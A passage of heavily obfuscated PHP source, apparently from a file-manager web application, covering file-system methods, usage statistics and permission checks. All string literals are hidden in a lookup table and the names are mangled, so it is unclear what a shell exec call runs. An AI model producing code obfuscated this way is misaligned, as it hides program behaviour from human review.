$ìË„ñ†ò[98] => intval(@filemtime($­ñøø¬â)), $ìË„ñ†ò[89] => $áºŞÓï ? 0 : intval($this->size($­ñøø¬â))); if ($áºŞÓï) { $this->listAll($­ñøø¬â, $«ï„ ³Ô); } } closedir($À”Â¤…­); return $«ï„ ³Ô; } public function has($„¤£ñôõ, $Ä”äÇèí = false, $·ªËöÍĞ = true) { $–±ƒŠè‚ =& $_SERVER[è¶³ÒßÑ]; $„¤£ñôõ = $this->iconvSystem($„¤£ñôõ); $„¤£ñôõ = rtrim($„¤£ñôõ, $–±ƒŠè‚[8]) . $–±ƒŠè‚[8]; if (!($Ãªä«Ò— = @opendir($„¤£ñôõ))) { return !1; } $ÄÄÜ¬ìø = 0; $ßƒáå¼Ğ = 0; $­˜µ°„Å = 0; while (($±ÑÀï²û = readdir($Ãªä«Ò—)) !== !1) { if ($±ÑÀï²û == $–±ƒŠè‚[10] || $±ÑÀï²û == $–±ƒŠè‚[1338]) { continue; } $§‘Ùçş¸ = $„¤£ñôõ . $±ÑÀï²û; if ($Ä”äÇèí) { $­˜µ°„Å++; if (@is_file($§‘Ùçş¸)) { $ÄÄÜ¬ìø++; } else { $ßƒáå¼Ğ++; } if ($­˜µ°„Å > 10000) { break; } continue; } if ($·ªËöÍĞ) { if (@is_file($§‘Ùçş¸)) { return !0; } } else { if (@is_dir($§‘Ùçş¸ . $–±ƒŠè‚[8])) { return !0; } } } closedir($Ãªä«Ò—); if ($Ä”äÇèí) { return array($–±ƒŠè‚[249] => $ÄÄÜ¬ìø, $–±ƒŠè‚[250] => $ßƒáå¼Ğ); } return !1; } public function hashSimple($ÓşéÉ­) { $Ã°¶í·ü =& $_SERVER[è¶³ÒßÑ]; if (!$ÓşéÉ­) { return md5($Ã°¶í·ü[12]); } $ÓşéÉ­ = $this->iconvSystem($ÓşéÉ­); $ÜùÎÙÖó = $this->size($ÓşéÉ­); $Ç£“åÍİ = 200; $¨Ãµ„û¯ = 50; if ($ÜùÎÙÖó <= $Ç£“åÍİ * $¨Ãµ„û¯) { return $this->hashMd5($ÓşéÉ­) . $ÜùÎÙÖó; } $è œê·ú = $Ã°¶í·ü[12]; $Ç¡ç‰Ÿ = intval($ÜùÎÙÖó / $¨Ãµ„û¯); $Ãı„ÏÎİ = fopen($ÓşéÉ­, $Ã°¶í·ü[1434]); if (!$Ãı„ÏÎİ) { return $è œê·ú; } for ($­ïËã÷ = 0; $­ïËã÷ < $¨Ãµ„û¯; $­ïËã÷++) { fseek_64($Ãı„ÏÎİ, $Ç¡ç‰Ÿ * $­ïËã÷); $è œê·ú .= fread($Ãı„ÏÎİ, $Ç£“åÍİ); } fseek_64($Ãı„ÏÎİ, $ÜùÎÙÖó - $Ç£“åÍİ); $è œê·ú .= fread($Ãı„ÏÎİ, $Ç£“åÍİ); fclose($Ãı„ÏÎİ); return md5($è œê·ú) . $ÜùÎÙÖó; } public function getContent($–ÇÂ´Ñ) { $–ÇÂ´Ñ = $this->iconvSystem($–ÇÂ´Ñ); return file_get_contents($–ÇÂ´Ñ); } public function setContent($ŞÍÅæ‹¡, $ü¶ÊÔ–Ñ = '') { $ŞÍÅæ‹¡ = $this->iconvSystem($ŞÍÅæ‹¡); $¾ŞŒÜıÏ = @file_put_contents($ŞÍÅæ‹¡, $ü¶ÊÔ–Ñ, LOCK_EX); if (!$¾ŞŒÜıÏ) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); } clearstatcache(); @chmod($ŞÍÅæ‹¡, $this->pathAuth); return $¾ŞŒÜıÏ === !1 ? !1 : !0; } public function fileSubstr($›‘µæ›û, $ªİ½º® = 0, $œí·Êì = false) { $È’ÚÔ­“ =& $_SERVER[è¶³ÒßÑ]; $›‘µæ›û = $this->iconvSystem($›‘µæ›û); if ($œí·Êì === !1) { $œí·Êì = $this->size($›‘µæ›û); } if ($œí·Êì <= 0) { return $È’ÚÔ­“[12]; } $îú£Œñ = fopen($›‘µæ›û, $È’ÚÔ­“[1434]); if (!$îú£Œñ) { return !1; } fseek_64($îú£Œñ, $ªİ½º®); $‚·Í¸˜ü = fread($îú£Œñ, $œí·Êì); fclose($îú£Œñ); if (!$‚·Í¸˜ü) { $this->writeLog(__FUNCTION__ . $È’ÚÔ­“[1426], !0); } return $‚·Í¸˜ü; } public function upload($»´¤‹ú, $ç…õĞ, $Áû‘éÎÅ = false, $Î£¢ë±ü = REPEAT_REPLACE) { if ($Áû‘éÎÅ) { return $this->moveFile($ç…õĞ, $»´¤‹ú); } return $this->copyFile($ç…õĞ, $»´¤‹ú); } public function setModifyTime($ß„’™é½, $‘Ü™²ƒÜ = '') { @touch($ß„’™é½, intval($‘Ü™²ƒÜ)); } public function download($†«°Ùæ, $‹à‹Û†é) { return $this->iconvSystem($†«°Ùæ); } } goto e†«‘âÊ¤Û; E‹›‹’Ô‹: class AnalysisModel extends ModelBaseLight { public function init($‰¶Õ¨»¤) { $±’Ê¯†Ø =& $_SERVER[è¶³ÒßÑ]; $Ç„šŸƒÆ = array($±’Ê¯†Ø[655] => array($±’Ê¯†Ø[33] => $±’Ê¯†Ø[1888], $±’Ê¯†Ø[343] => array($±’Ê¯†Ø[265], $±’Ê¯†Ø[819], $±’Ê¯†Ø[1889], $±’Ê¯†Ø[1890])), $±’Ê¯†Ø[1891] => array($±’Ê¯†Ø[33] => $±’Ê¯†Ø[1892], $±’Ê¯†Ø[343] => array($±’Ê¯†Ø[265], $±’Ê¯†Ø[817], $±’Ê¯†Ø[1893], $±’Ê¯†Ø[1894], $±’Ê¯†Ø[1895]))); if (!isset($Ç„šŸƒÆ[$‰¶Õ¨»¤])) { return !1; } $this->optionType = $Ç„šŸƒÆ[$‰¶Õ¨»¤][$±’Ê¯†Ø[33]]; $this->field = $Ç„šŸƒÆ[$‰¶Õ¨»¤][$±’Ê¯†Ø[343]]; return !0; } public function listData($£Ø÷˜¶Á = false, $½‰»¼ı± = "\x6d\x6f\144\151\x66\x79\x54\151\x6d\x65", $ ¤¾ã¨ = false) { return parent::listData($£Ø÷˜¶Á, $½‰»¼ı±, $ ¤¾ã¨); } public function trendList($µÖÛş·¨) { $şÔšâÒ· =& $_SERVER[è¶³ÒßÑ]; $°ŞÚÉ«Ğ = $this->listData(); if ($°ŞÚÉ«Ğ) { $‹Í…œ–› = end($°ŞÚÉ«Ğ); $·–Ë”¸Š = date($şÔšâÒ·[1896], strtotime($şÔšâÒ·[1897])); if ($‹Í…œ–›[$şÔšâÒ·[265]] == $·–Ë”¸Š) { return $°ŞÚÉ«Ğ; } $ÈÊçÈ¾ö = strtotime($‹Í…œ–›[$şÔšâÒ·[265]]); } if (!isset($ÈÊçÈ¾ö)) { $ÙÎƒÁ = $µÖÛş·¨ == $şÔšâÒ·[655] ? $şÔšâÒ·[591] : $şÔšâÒ·[878]; $ÈÊçÈ¾ö = Model($ÙÎƒÁ)->min($şÔšâÒ·[241]); } $²äìÍˆ = $şÔšâÒ·[1898] . ucfirst($µÖÛş·¨); $À•ÚãÚÎ = $this->dateList($ÈÊçÈ¾ö); foreach ($À•ÚãÚÎ as $·–Ë”¸Š) { $this->{$²äìÍˆ}($·–Ë”¸Š); } return $this->listData(); } private function dateList($ô—ı±µ) { $¹üÏĞ¥Æ =& $_SERVER[è¶³ÒßÑ]; $…§•¼¬ì = $ô—ı±µ; $œâÎÂ§Ù = strtotime($¹üÏĞ¥Æ[1897]); $ñòññ‰ = array(); while ($…§•¼¬ì <= $œâÎÂ§Ù) { $ñòññ‰[] = date($¹üÏĞ¥Æ[1896], $…§•¼¬ì); $…§•¼¬ì = strtotime($¹üÏĞ¥Æ[1899], $…§•¼¬ì); } return $ñòññ‰; } public function _recordUser($½¬Áíş• = '') { $ËÆ¨º¸Í =& $_SERVER[è¶³ÒßÑ]; $èÏ¾¤á† = strtotime(date($ËÆ¨º¸Í[1900], strtotime($½¬Áíş•))); $£Í‰ÔË = strtotime(date($ËÆ¨º¸Í[1901], strtotime($½¬Áíş•))); $¯ñçªâ = array($ËÆ¨º¸Í[241] => array($ËÆ¨º¸Í[1066], $£Í‰ÔË)); $ÅÖ°ŒÜ = Model($ËÆ¨º¸Í[591])->where($¯ñçªâ)->count($ËÆ¨º¸Í[1761]); $¯ñçªâ[$ËÆ¨º¸Í[241]] = array($ËÆ¨º¸Í[402], array($èÏ¾¤á†, $£Í‰ÔË)); $Ö’ë¨Ïœ = Model($ËÆ¨º¸Í[591])->where($¯ñçªâ)->count($ËÆ¨º¸Í[1761]); $¯ñçªâ[$ËÆ¨º¸Í[33]] = $ËÆ¨º¸Í[1902]; $å¾ÆãÛ = Model($ËÆ¨º¸Í[1903])->where($¯ñçªâ)->count($ËÆ¨º¸Í[1904]); $Š“áüŞ = array($ËÆ¨º¸Í[265] => $½¬Áíş•, $ËÆ¨º¸Í[819] => (int) $ÅÖ°ŒÜ, $ËÆ¨º¸Í[1889] => (int) $Ö’ë¨Ïœ, $ËÆ¨º¸Í[1890] => (int) $å¾ÆãÛ); return $this->insert($Š“áüŞ); } public function _recordStore($À«šŠ¾° = '') { $öóæ—ôö =& $_SERVER[è¶³ÒßÑ]; $ÆøõÉøÌ = strtotime(date($öóæ—ôö[1901], strtotime($À«šŠ¾°))); $Ñ°Ê¹ = array($öóæ—ôö[241] => array($öóæ—ôö[1066], $ÆøõÉøÌ)); $Í»ø‘Õè = Model($öóæ—ôö[537])->where($Ñ°Ê¹)->sum($öóæ—ôö[89]); $Ñ°Ê¹[$öóæ—ôö[478]] = 0; $µçáõ‹™ = Model($öóæ—ôö[878])->where($Ñ°Ê¹)->sum($öóæ—ôö[89]); $Ñ°Ê¹[$öóæ—ôö[200]] = 1; $´ƒß»—Ú = Model($öóæ—ôö[878])->where($Ñ°Ê¹)->sum($öóæ—ôö[89]); $Ñ°Ê¹[$öóæ—ôö[200]] = 2; $¨£é®˜í = Model($öóæ—ôö[878])->where($Ñ°Ê¹)->sum($öóæ—ôö[89]); $ªÍÊ†ßÑ = array($öóæ—ôö[265] => $À«šŠ¾°, $öóæ—ôö[817] => (int) $µçáõ‹™, $öóæ—ôö[1893] => (int) $Í»ø‘Õè, $öóæ—ôö[1894] => (int) $´ƒß»—Ú, $öóæ—ôö[1895] => (int) $¨£é®˜í); return $this->insert($ªÍÊ†ßÑ); } public function trend($ºíó™‰¢, $¯â·ü†Ÿ) { $‰½³ºññ =& $_SERVER[è¶³ÒßÑ]; if (!$this->init($ºíó™‰¢)) { return !1; } $ìíÁ‘ŸÍ = $this->trendList($ºíó™‰¢); if ($ìíÁ‘ŸÍ && $¯â·ü†Ÿ != $‰½³ºññ[1734]) { $©ÒĞö = $ìíÁ‘ŸÍ[0][$‰½³ºññ[265]]; $ŸçÀÔ…³ = $this->validDate($¯â·ü†Ÿ, $©ÒĞö); $ëÙ‡İ€ = array(); $ŸÛ““¶ú = array_to_keyvalue($ìíÁ‘ŸÍ, $‰½³ºññ[265]); foreach ($ŸçÀÔ…³ as $ô’¦ã¤–) { if (isset($ŸÛ““¶ú[$ô’¦ã¤–])) { $òÂ¤Ş§ = $ŸÛ““¶ú[$ô’¦ã¤–]; } else { $òÂ¤Ş§ = end($ìíÁ‘ŸÍ); $òÂ¤Ş§[$‰½³ºññ[265]] = $ô’¦ã¤–; if ($ºíó™‰¢ == $‰½³ºññ[655]) { $òÂ¤Ş§[$‰½³ºññ[1889]] = $òÂ¤Ş§[$‰½³ºññ[1890]] = 0; } } $ëÙ‡İ€[] = $òÂ¤Ş§; } $ìíÁ‘ŸÍ = $ëÙ‡İ€; } $ÉÈÑº‰Å = array($‰½³ºññ[655] => array($‰½³ºññ[819] => LNG($‰½³ºññ[1905]), $‰½³ºññ[1889] => LNG($‰½³ºññ[1906]), $‰½³ºññ[1890] => LNG($‰½³ºññ[1907])), $‰½³ºññ[1891] => array($‰½³ºññ[817] => LNG($‰½³ºññ[1908]), $‰½³ºññ[1893] => LNG($‰½³ºññ[1909]), $‰½³ºññ[1894] => LNG($‰½³ºññ[1910]), $‰½³ºññ[1895] => LNG($‰½³ºññ[1911]))); $ˆïÂÛ÷” = array($‰½³ºññ[655] => $‰½³ºññ[1912], $‰½³ºññ[1891] => $‰½³ºññ[89]); if (empty($ìíÁ‘ŸÍ)) { $ô’¦ã¤– = date($‰½³ºññ[1896], strtotime($‰½³ºññ[1897])); $ƒƒ“Œ = array($‰½³ºññ[265] => $ô’¦ã¤–); foreach ($ÉÈÑº‰Å[$ºíó™‰¢] as $Òß´Ù° => $àé®ÁÕ) { $ƒƒ“Œ[$Òß´Ù°] = 0; } $ìíÁ‘ŸÍ[] = $ƒƒ“Œ; } $¼Åµë•‘ = array(); foreach ($ìíÁ‘ŸÍ as $àé®ÁÕ) { if ($ºíó™‰¢ == $‰½³ºññ[1891] && $àé®ÁÕ[$‰½³ºññ[1893]] > $àé®ÁÕ[$‰½³ºññ[817]]) { $àé®ÁÕ[$‰½³ºññ[1893]] = $àé®ÁÕ[$‰½³ºññ[817]]; } foreach ($ÉÈÑº‰Å[$ºíó™‰¢] as $Òß´Ù° => $£²Ü–Üğ) { $òÂ¤Ş§ = array($‰½³ºññ[265] => $àé®ÁÕ[$‰½³ºññ[265]], $‰½³ºññ[1650] => $£²Ü–Üğ); $òÂ¤Ş§[$ˆïÂÛ÷”[$ºíó™‰¢]] = isset($àé®ÁÕ[$Òß´Ù°]) ? $àé®ÁÕ[$Òß´Ù°] : 0; $¼Åµë•‘[] = $òÂ¤Ş§; } } return $¼Åµë•‘; } public function validDate($çºíÌÁì, $”•¾ØÛ‡) { $ÉôÉı†’ =& $_SERVER[è¶³ÒßÑ]; $…ßøè¢ = date($ÉôÉı†’[1896], strtotime($ÉôÉı†’[1897])); $³ğœçß = array($…ßøè¢); switch ($çºíÌÁì) { case $ÉôÉı†’[1741]: $ú†Î¿£Á = mktime(0, 0, 0, date($ÉôÉı†’[1913]), date($ÉôÉı†’[1427]) - date($ÉôÉı†’[1519]) + 7 - 7, date($ÉôÉı†’[1914])); $Î±ú±¹¼ = 0; do { $ûñÔ°¡‚ = date($ÉôÉı†’[1896], $ú†Î¿£Á - 3600 * 24 * 7 * $Î±ú±¹¼); $³ğœçß[] = $ûñÔ°¡‚; $Î±ú±¹¼++; } while ($”•¾ØÛ‡ < $ûñÔ°¡‚); break; case $ÉôÉı†’[1739]: $Î±ú±¹¼ = 1; do { $Ï€—àˆ = date($ÉôÉı†’[1915], strtotime("\55\x20{$Î±ú±¹¼}\x20\x6d\157\156\x74\150\x73")); $³ğœçß[] = $Ï€—àˆ; $Î±ú±¹¼++; } while ($”•¾ØÛ‡ < $Ï€—àˆ); break; case $ÉôÉı†’[1916]: $›øÂÄ = (int) date($ÉôÉı†’[1914], strtotime($”•¾ØÛ‡)); $²«ø‚  = (int) date($ÉôÉı†’[1914]); if ($›øÂÄ >= $²«ø‚ ) { break; } for ($›øÂÄ; $›øÂÄ < $²«ø‚ ; $›øÂÄ++) { $³ğœçß[] = $›øÂÄ . $ÉôÉı†’[1917]; } break; default: break; } if ($”•¾ØÛ‡ > end($³ğœçß)) { array_pop($³ğœçß); } sort($³ğœçß); return $³ğœçß; } public function listTable($ïâ·²‘Ÿ) { $ÍÈÉ›¸ = ucfirst($ïâ·²‘Ÿ); return Model($ÍÈÉ›¸)->listData(); } public function option($èÄ¥”´¡) { $‚«ş­Â = $_SERVER[è¶³ÒßÑ][1918] . ucfirst($èÄ¥”´¡); return $this->{$‚«ş­Â}(); } private function optionUser() { $øÁğ¦¼Ü =& $_SERVER[è¶³ÒßÑ]; $Ï¹ûÃµ§ = Model($øÁğ¦¼Ü[591])->count($øÁğ¦¼Ü[1761]); $Ù§ğÖÁı = Model($øÁğ¦¼Ü[591])->where($øÁğ¦¼Ü[1919])->count($øÁğ¦¼Ü[1761]); $¤åªŸê² = intval($GLOBALS[$øÁğ¦¼Ü[6]][$øÁğ¦¼Ü[418]][$øÁğ¦¼Ü[1707]]) / 3600; $óÍ˜–Ï = strtotime("\55{$¤åªŸê²}\x20\x68\x6f\165\x72\163"); $êÄ¾ë°¹ = strtotime(date($øÁğ¦¼Ü[1900])); if ($óÍ˜–Ï < $êÄ¾ë°¹) { $óÍ˜–Ï = $êÄ¾ë°¹; } $²¬¿Ï¤£ = array($øÁğ¦¼Ü[1920] => array($øÁğ¦¼Ü[1067], $óÍ˜–Ï)); $‡õçƒæÉ = (int) Model($øÁğ¦¼Ü[591])->where($²¬¿Ï¤£)->count($øÁğ¦¼Ü[1761]); if (!$‡õçƒæÉ) { $‡õçƒæÉ = 1; } $²¬¿Ï¤£ = array($øÁğ¦¼Ü[1920] => array($øÁğ¦¼Ü[1067], $êÄ¾ë°¹)); $¯Ášúä€ = Model($øÁğ¦¼Ü[591])->where($²¬¿Ï¤£)->count($øÁğ¦¼Ü[1761]); return array($øÁğ¦¼Ü[812] => (int) $Ï¹ûÃµ§, $øÁğ¦¼Ü[1921] => (int) ($Ï¹ûÃµ§ - $Ù§ğÖÁı), $øÁğ¦¼Ü[1922] => (int) $Ù§ğÖÁı, $øÁğ¦¼Ü[1923] => (int) $¯Ášúä€, $øÁğ¦¼Ü[1924] => $‡õçƒæÉ); } private function optionFile() { $®±Üñª… =& $_SERVER[è¶³ÒßÑ]; $±ø–â» = $this->sourceSize(); $å¸ğ• = $±ø–â»[$®±Üñª…[89]]; $¬ä²ä°ä = $±ø–â»[$®±Üñª…[1893]]; $•”çïæ = Model($®±Üñª…[878])->where(array($®±Üñª…[478] => 0))->count($®±Üñª…[203]); $†Óó—Ô = array($®±Üñª…[478] => 0, $®±Üñª…[241] => array($®±Üñª…[1067], strtotime(date($®±Üñª…[1900])))); $•ª¦Ö‹à = Model($®±Üñª…[878])->where($†Óó—Ô)->sum($®±Üñª…[89]); $ËíèËÖ¬ = Model($®±Üñª…[878])->where($†Óó—Ô)->count($®±Üñª…[203]); return array($®±Üñª…[817] => $å¸ğ•, $®±Üñª…[1893] => $¬ä²ä°ä, $®±Üñª…[1925] => $å¸ğ• - $¬ä²ä°ä, $®±Üñª…[1926] => (int) $•ª¦Ö‹à, $®±Üñª…[819] => (int) $•”çïæ, $®±Üñª…[1927] => (int) $ËíèËÖ¬); } private function optionAccess() { $ÏèÉ§è— =& $_SERVER[è¶³ÒßÑ]; return array($ÏèÉ§è—[812] => $this->typeLogCnt(), $ÏèÉ§è—[120] => $this->typeLogCnt($ÏèÉ§è—[120]), $ÏèÉ§è—[518] => $this->typeLogCnt($ÏèÉ§è—[518]), $ÏèÉ§è—[1928] => $this->typeLogCnt($ÏèÉ§è—[1928]), $ÏèÉ§è—[1929] => $this->typeLogCnt($ÏèÉ§è—[1929]), $ÏèÉ§è—[655] => $this->typeLogCnt($ÏèÉ§è—[12], $ÏèÉ§è—[1904])); } private function typeLogCnt($‡ÊÃìû = '', $àèûˆî¤ = "\151\x64") { $şõğëù =& $_SERVER[è¶³ÒßÑ]; $°ìºòè´ = array($şõğëù[120] => array($şõğëù[1930], $şõğëù[1931]), $şõğëù[518] => array($şõğëù[1932], $şõğëù[1933]), $şõğëù[1928] => array($şõğëù[1934], $şõğëù[1935], $şõğëù[1936]), $şõğëù[1929] => array($şõğëù[1937], $şõğëù[1938]), $şõğëù[1939] => array($şõğëù[1940], $şõğëù[1941], $şõğëù[1942])); $¹™ıé = strtotime(date($şõğëù[1900])); $Èİ£Ã = array($şõğëù[241] => array($şõğëù[1067], $¹™ıé)); if ($‡ÊÃìû) { $Èİ£Ã[$şõğëù[33]] = array($şõğëù[7], $°ìºòè´[$‡ÊÃìû]); } $¤ëëœõã = Model($şõğëù[1903])->where($Èİ£Ã)->count($àèûˆî¤); return (int) $¤ëëœõã; } private function optionServer() { $„²½Ûûû =& $_SERVER[è¶³ÒßÑ]; $´¯ùÉ®¤ = $this->diskDriver(); $‹¹ì±§ = KodIO::defaultDriver(); $İİ¬½³… = array($„²½Ûûû[871] => $‹¹ì±§[$„²½Ûûû[468]]); $ĞèÂ¬•ä = Model($„²½Ûûû[537])->where($İİ¬½³…)->sum($„²½Ûûû[89]); $ƒ’•Ğˆ¤ = explode($„²½Ûûû[53], $_SERVER[$„²½Ûûû[157]]); $…‰ »ÛÎ = $ƒ’•Ğˆ¤[0]; $Š½‚›•Ñ = $GLOBALS[$„²½Ûûû[6]][$„²½Ûûû[21]]; $×ô½ ¨ = $Š½‚›•Ñ[$„²½Ûûû[1029]]; if ($×ô½ ¨ == $„²½Ûûû[1017]) { $Ì…òåÍ» = explode($„²½Ûûû[1343], $Š½‚›•Ñ[$„²½Ûûû[1028]]); $×ô½ ¨ = $Ì…òåÍ»[0]; } if ($×ô½ ¨ == $„²½Ûûû[965] || $×ô½ ¨ == $„²½Ûûû[858]) { $¦ïÊ‚–„ = Model()->db()->query($„²½Ûûû[1943]); $»çº÷ß = $¦ïÊ‚–„[0] && isset($¦ïÊ‚–„[0][$„²½Ûûû[1649]]) ? $¦ïÊ‚–„[0][$„²½Ûûû[1649]] : 0; $×ô½ ¨ = $„²½Ûûû[1944] . ($»çº÷ß ? $„²½Ûûû[8] . $»çº÷ß : $„²½Ûûû[12]); } $ñõŞ´©é = $GLOBALS[$„²½Ûûû[6]][$„²½Ûûû[418]][$„²½Ûûû[880]]; return array($„²½Ûûû[1945] => $´¯ùÉ®¤ ? $´¯ùÉ®¤[$„²½Ûûû[1946]] : 0, $„²½Ûûû[1947] => $´¯ùÉ®¤ ? $´¯ùÉ®¤[$„²½Ûûû[1948]] : 0, $„²½Ûûû[1949] => (int) $‹¹ì±§[$„²½Ûûû[1946]] * 1024 * 1024 * 1024, $„²½Ûûû[1950] => (int) $ĞèÂ¬•ä, $„²½Ûûû[1951] => ucfirst($…‰ »ÛÎ), $„²½Ûûû[1952] => $„²½Ûûû[1953] . PHP_VERSION, $„²½Ûûû[1954] => phpBuild64() ? 64 : 32, $„²½Ûûû[811] => str_replace($„²½Ûûû[1186], $„²½Ûûû[1045], $×ô½ ¨), $„²½Ûûû[418] => ucfirst($ñõŞ´©é), $„²½Ûûû[32] => $_SERVER[$„²½Ûûû[1955]]); } private function diskDriver() { $¸ê»ƒÔ =& $_SERVER[è¶³ÒßÑ]; $ÕÜ‘…ÉÏ = $¸ê»ƒÔ[8]; $Á¬ãà²Ñ = $GLOBALS[$¸ê»ƒÔ[6]][$¸ê»ƒÔ[1360]] == $¸ê»ƒÔ[1361]; if ($Á¬ãà²Ñ) { $ÕÜ‘…ÉÏ = $¸ê»ƒÔ[1956]; if (function_exists($¸ê»ƒÔ[1957])) { exec($¸ê»ƒÔ[1958], $îşá‡¹—); $ÕÜ‘…ÉÏ = $îşá‡¹—[1] . $¸ê»ƒÔ[8]; } } if (!file_exists($ÕÜ‘…ÉÏ)) { return; } $»áá¯²¸ = @disk_total_space($ÕÜ‘…ÉÏ); $â®Œó½ç = $»áá¯²¸ - @disk_free_space($ÕÜ‘…ÉÏ); return array($¸ê»ƒÔ[1946] => $»áá¯²¸, $¸ê»ƒÔ[1948] => $â®Œó½ç); } public function fileChart($ç‘åÙ©) { $‡ çÄĞ =& $_SERVER[è¶³ÒßÑ]; if (isset($ç‘åÙ©[$‡ çÄĞ[1761]])) { return Model($‡ çÄĞ[878])->userFileTypeProfile($ç‘åÙ©[$‡ çÄĞ[1761]]); } if (isset($ç‘åÙ©[$‡ çÄĞ[1959]])) { return Model($‡ çÄĞ[878])->groupFileTypeProfile($ç‘åÙ©[$‡ çÄĞ[1959]]); } $Õ‘áâ´ = $this->sourceSize(); $»»º Æˆ = array($‡ çÄĞ[202] => 0, $‡ çÄĞ[200] => 1); $Æ ü’¡ = Model($‡ çÄĞ[878])->where($»»º Æˆ)->sum($‡ çÄĞ[89]); $»»º Æˆ[$‡ çÄĞ[200]] = 2; $“®‹“ßÛ = Model($‡ çÄĞ[878])->where($»»º Æˆ)->sum($‡ çÄĞ[89]); return array($‡ çÄĞ[817] => $Õ‘áâ´[$‡ çÄĞ[89]], $‡ çÄĞ[1893] => $Õ‘áâ´[$‡ çÄĞ[1893]], $‡ çÄĞ[1894] => (int) $Æ ü’¡, $‡ çÄĞ[1895] => (int) $“®‹“ßÛ); } private function sourceSize() { $ÖüÁ¾ôç =& $_SERVER[è¶³ÒßÑ]; $“Şïïì¾ = Model($ÖüÁ¾ôç[878])->where(array($ÖüÁ¾ôç[478] => 0))->sum($ÖüÁ¾ôç[89]); $ÓÃïßÇ¥ = Model($ÖüÁ¾ôç[537])->sum($ÖüÁ¾ôç[89]); if ($ÓÃïßÇ¥ > $“Şïïì¾) { $ÓÃïßÇ¥ = $“Şïïì¾; } return array($ÖüÁ¾ôç[89] => (int) $“Şïïì¾, $ÖüÁ¾ôç[1893] => (int) $ÓÃïßÇ¥); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ôâ‘® ñ =& $_SERVER[è¶³ÒßÑ]; $„Ë½“Îå = array(array($Ôâ‘® ñ[487] => LNG($Ôâ‘® ñ[1960]), $Ôâ‘® ñ[1961] => $Ôâ‘® ñ[1962], $Ôâ‘® ñ[1963] => 1, $Ôâ‘® ñ[1964] => 1, $Ôâ‘® ñ[1965] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ôâ‘® ñ[487] => LNG($Ôâ‘® ñ[1966]), $Ôâ‘® ñ[1961] => $Ôâ‘® ñ[1967], $Ôâ‘® ñ[1963] => 2, $Ôâ‘® ñ[1964] => 1, $Ôâ‘® ñ[1965] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ôâ‘® ñ[487] => LNG($Ôâ‘® ñ[1968]), $Ôâ‘® ñ[1961] => $Ôâ‘® ñ[1969], $Ôâ‘® ñ[1963] => 3, $Ôâ‘® ñ[1964] => 1, $Ôâ‘® ñ[1965] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ôâ‘® ñ[487] => LNG($Ôâ‘® ñ[1970]), $Ôâ‘® ñ[1961] => $Ôâ‘® ñ[1971], $Ôâ‘® ñ[1963] => 4, $Ôâ‘® ñ[1964] => 1, $Ôâ‘® ñ[1965] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ôâ‘® ñ[487] => LNG($Ôâ‘® ñ[1972]), $Ôâ‘® ñ[1961] => $Ôâ‘® ñ[1973], $Ôâ‘® ñ[1963] => 5, $Ôâ‘® ñ[1964] => 1, $Ôâ‘® ñ[1965] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ôâ‘® ñ[487] => LNG($Ôâ‘® ñ[1974]), $Ôâ‘® ñ[1961] => $Ôâ‘® ñ[1975], $Ôâ‘® ñ[1963] => 6, $Ôâ‘® ñ[1964] => 1, $Ôâ‘® ñ[1965] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ôâ‘® ñ[487] => LNG($Ôâ‘® ñ[1976]), $Ôâ‘® ñ[1961] => $Ôâ‘® ñ[1977], $Ôâ‘® ñ[1963] => 7, $Ôâ‘® ñ[1964] => 1, $Ôâ‘® ñ[1965] => 0)); return $„Ë½“Îå; } public static function authCheck($ÊºÄò§—, $°ú¨Ô•ú) { $ØÃÈ‡¬ =& $_SERVER[è¶³ÒßÑ]; $ÊºÄò§— = intval($ÊºÄò§—); if (KodUser::isRoot() && $GLOBALS[$ØÃÈ‡¬[6]][$ØÃÈ‡¬[1978]]) { return !0; } if ($ÊºÄò§— <= 0) { return !1; } if (($ÊºÄò§— & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÊºÄò§— & $°ú¨Ô•ú); } public static function authCheckShow($‰±ÃÀÇß) { return self::authCheck($‰±ÃÀÇß, self::AUTH_SHOW); } public static function authCheckView($±‡¡‡”) { return self::authCheck($±‡¡‡”, self::AUTH_VIEW); } public static function authCheckDownload($´Šé¡ê) { return self::authCheck($´Šé¡ê, self::AUTH_DOWNLOAD); } public static function authCheckUpload($î©öÆè) { return self::authCheck($î©öÆè, self::AUTH_UPLOAD); } public static function authCheckEdit($·óÖŒ’) { return self::authCheck($·óÖŒ’, self::AUTH_EDIT); } public static function authCheckRemove($şäØ¦ê©) { return self::authCheck($şäØ¦ê©, self::AUTH_REMOVE); } public static function authCheckShare($ş«ßı¼¶) { return self::authCheck($ş«ßı¼¶, self::AUTH_SHARE); } public static function authCheckComment($ÛîßŠÔû) { return self::authCheck($ÛîßŠÔû, self::AUTH_COMMENT); } public static function authCheckEvent($…ùÍ¾ß‘) { return self::authCheck($…ùÍ¾ß‘, self::AUTH_EVENT); } public static function authCheckRoot($Å™åğ) { return self::authCheck($Å™åğ, self::AUTH_ROOT); } public static function authCheckAction($Ë»¸şé¥, $ÈÙ™öõ) { $‰ „ ç½ =& 